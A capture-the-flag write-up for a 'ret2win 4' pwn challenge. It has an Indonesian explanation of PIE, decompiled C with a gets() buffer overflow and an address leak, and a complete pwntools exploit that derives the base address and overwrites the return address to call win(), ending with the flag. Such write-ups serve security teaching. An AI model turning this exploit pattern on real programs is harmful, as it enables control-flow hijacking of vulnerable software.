# [Pwn] ret2win 4

## 📚 Overview

> *"Mitigasi lain untuk menyusahkan penyerang dalam mengubah alur program adalah PIE. PIE adalah singkatan dari Position Independent Executable yang mengakibatkan program kita untuk di-load ke dalam memori dengan offset random. Jadi walaupun ada buffer overflow, penyerang tidak tau alamat dari fungsi/instruksi yang ingin dijalankan. Tapi, kalau kita bisa dapetin salah satu alamat dari program saat dijalankan, alamat dari fungsi/instruksi yang ingin dijalankan tinggal dihitung dari selisihnya dengan alamat yang udah didapetin tadi."*

## 💻 Decompiled Code

The binary given has enabled the feature of **PIE** to mitigate buffer overflow attack. However, a variable's memory address was *leak* so we will use the value to calculate the offset.

```c
void win(void)
{
  char flag [104];
  FILE *file;
  
  file = fopen("flag.txt","r");
  if (file == (FILE *)0x0) {
    printf("flag.txt not found");
    exit(-1);
  }
  fgets(flag,100,file);
  fclose(file);
  printf("Wow, how did you get here? Here\'s the flag:\n%s",flag);
  return;
}

undefined8 main(void)
{
  char buffer [112];
  
  printf("Here\'s a gift for you: 0x%lx\n",&what_is_this_for);
  printf("Give me your payload: ");
  gets(buffer);
  return 0;
}
```

## ⚙ Full Script

**Payload >** Calculate the offset used by the binary, add the offset's value to the `RET_ADDR` and `WIN_ADDR`, overflow the buffer to reach the stack, and then overwrite the RIP with `win()` address.

```python
from pwn import *
elf = context.binary = ELF("./ret2win", checksec=False)

p = process('./ret2win')
# p = remote("IP_ADDR", PORT)

p.recvuntil(b'Here\'s a gift for you: ')
LEAK_ADDR = int(p.recv(14), 16)
BASE_ADDR = LEAK_ADDR - elf.symbols.what_is_this_for

offset = 0x78
RET_ADDR = p64(0x101a + BASE_ADDR)
WIN_ADDR = p64(elf.symbols.win + BASE_ADDR)

rop = ROP(elf)
rop.raw(RET_ADDR)
rop.raw(WIN_ADDR)

payload = b'A' * offset + rop.chain()
p.sendlineafter(b"Give me your payload: ", payload)

response = p.recvall(timeout=1).strip()
print(response.decode())

# TCP1P{leak_satu_alamat_semua_alamat_ketahuan}

p.close()
```